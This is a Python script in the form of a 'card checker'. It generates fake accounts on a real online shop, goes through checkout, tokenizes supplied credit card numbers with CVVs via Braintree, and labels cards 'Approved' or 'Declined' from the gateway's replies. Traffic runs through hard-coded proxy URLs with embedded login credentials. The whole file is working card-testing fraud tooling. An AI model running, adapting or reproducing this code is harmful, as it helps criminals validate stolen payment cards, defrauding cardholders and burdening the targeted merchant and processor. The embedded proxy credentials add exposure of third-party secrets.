import names
import os
import time
import base64
import random
from requests import Session
import requests
from retry_requests import retry
import urllib3
from requests import Session

def find_str(data, first, last):
  try: return data[data.index( first ) + len( first ):data.index( last, data.index( first ) + len( first ) )]
  except ValueError: return None  
  


class b3:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        if len(partes) == 4:
            self.cc = (partes[0])

            self.mes = (partes[1])
            self.ano = (partes[2])
            self.cvv = (partes[3])

        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        self.last_4 = self.cc[12:]
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
    def main(self):       
        try:
            username = self.username

            proxies = {'http': 'http://c028dedb1c24ffbb:RNW78Fm5@res.proxy-seller.com:10000','https': 'http://c028dedb1c24ffbb:RNW78Fm5@res.proxy-seller.com:10000'}
        
            session = requests.Session()
            session.proxies.update({'http://': 'jmqm9spstv88://ropatjem:jmqm9spstv88@185.242.93.188:8528', 'https://': 'jmqm9spstv88://ropatjem:jmqm9spstv88@185.242.93.188:8528'})
            
            
            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/snickers-2502','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'option[3787]': '37521','option[3788]': '37532','option_numbers': '2','quantity': '1','product_id': '112'}
            session.post('https://snickersdirect.co.uk/index.php?route=checkout/cart/add',headers=headers,data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','referer': 'https://snickersdirect.co.uk/snickers-2502','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',}
            session.get('https://snickersdirect.co.uk/index.php?route=checkout/checkout', headers=headers)

            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest'}
            session.get('https://snickersdirect.co.uk/index.php?route=checkout/register', headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest'}
            data = {'customer_group_id': '1','firstname': username,'lastname': username,'email': username+'@gmail.com','telephone': '3655476455','fax': username+'@gmail.com','password': 'street 345','confirm': 'street 345','company': username,'address_1': 'street 345','address_2': 'street 345','city': 'NY','postcode': '10001','country_id': '223','zone_id': '3655','shipping_address': '1','agree': '1'}
            session.post('https://snickersdirect.co.uk/index.php?route=checkout/register/save',headers=headers,data=data)

            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            session.get('https://snickersdirect.co.uk/index.php?route=checkout/shipping_address',headers=headers)
            session.get('https://snickersdirect.co.uk/index.php?route=checkout/payment_address',headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest'}
            data = {'shipping_address': 'existing','address_id': '307804','firstname': '','lastname': '','company': '','address_1': '','address_2': '','city': '','postcode': '10001','country_id': '223','zone_id': '3655'}
            session.post('https://snickersdirect.co.uk/index.php?route=checkout/shipping_address/save',headers=headers,data=data)

            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest'}
            session.get('https://snickersdirect.co.uk/index.php?route=checkout/shipping_method',headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'shipping_method': 'ultimate_shipping.ultimate_shipping_0','comment': '',}
            session.post('https://snickersdirect.co.uk/index.php?route=checkout/shipping_method/save',headers=headers,data=data,)

            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            session.get('https://snickersdirect.co.uk/index.php?route=checkout/payment_method',headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'payment_method': 'braintree','comment': ''}
            session.post('https://snickersdirect.co.uk/index.php?route=checkout/payment_method/save',headers=headers,data=data)

            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            req_1 = session.get('https://snickersdirect.co.uk/index.php?route=checkout/confirm', headers=headers)
            token_eyj = find_str(req_1.text, "authorization: '","'" )
            bearer_token = base64.b64decode(token_eyj).decode('utf-8')
            bearer_final = find_str(bearer_token, '"authorizationFingerprint":"', '","')

            headers = {'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {bearer_final}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'dropin2','sessionId': 'e159b6c0-c895-4447-953b-03187966b5d0',},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': f'{self.cc}','expirationMonth': f'{self.mes}','expirationYear': f'{self.ano}','cvv': f'{self.cvv}','billingAddress': {'postalCode': '10001',},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard'}
            req_2 = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            token_2 = find_str(req_2.text,'{"token":"', '","')
            
            headers = {'accept': '*/*','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'}
            json_data = {'amount': '23.04','additionalInfo': {'acsWindowSize': '03','billingLine1': 'street 345','billingLine2': 'street 345','billingCity': 'NY','billingState': 'NY','billingPostalCode': '10001','billingCountryCode': 'US','billingPhoneNumber': '3655476455','billingGivenName': username,'billingSurname': username,'email': username+'@gmail.com',},'bin': f'{self.cc}','dfReferenceId': '1_aebf8141-f928-4acf-a861-6070886d26f3','clientMetadata': {'requestedThreeDSecureVersion': '2','sdkVersion': 'web/3.58.0','cardinalDeviceDataCollectionTimeElapsed': 5620,'issuerDeviceDataCollectionTimeElapsed': 431,'issuerDeviceDataCollectionResult': True,},'authorizationFingerprint': bearer_final,'braintreeLibraryVersion': 'braintree/web/3.58.0','_meta': {'merchantAppId': 'snickersdirect.co.uk','platform': 'web','sdkVersion': '3.58.0','source': 'client','integration': 'custom','integrationType': 'custom','sessionId': 'e159b6c0-c895-4447-953b-03187966b5d0',},}
            req_3 = session.post(f'https://api.braintreegateway.com/merchants/ty3y4q9pqxyrs5nx/client_api/v1/payment_methods/{token_2}/three_d_secure/lookup',headers=headers,json=json_data)
            tk_nonce = find_str(req_3.text,'nonce":"', '","' )

            headers = {'accept': '*/*','accept-language': 'es-ES,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://snickersdirect.co.uk','referer': 'https://snickersdirect.co.uk/index.php?route=checkout/checkout','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'nonce': tk_nonce,'device_data': '{"device_session_id":"969dc6aa80036a742b313d8c1dcc0583","fraud_merchant_id":null,"correlation_id":"a55decb92abd97ef2d2ac6e4fda05e57"}'}
            req_4 = session.post('https://snickersdirect.co.uk/index.php?route=extension/payment/braintree/chargeNonce',headers=headers,data=data)
            session.close()
            
            if 'Card Issuer Declined CVV' == req_4.text: return 'Approved! ✅', req_4.text
            elif 'Nice! New payment method added' in req_4.text:  return 'Approved! ✅', 'Approved'
            elif 'avs_and_cvv' in req_4.text:return 'Approved! ✅', req_4.text                 
            elif 'cvv: Gateway Rejected: cvv' in req_4.text: return 'Approved! ✅', req_4.text
            elif 'avs' in req_4.text: return 'Approved! ✅', req_4.text
            elif 'Insufficient Funds' in req_4.text: return 'Approved! ✅', req_4.text
            else:return 'Declined ❌', req_4.text            
        except: return 'Declined ❌', 'Le dieron sueño alas proxys y esta ( zzz )'




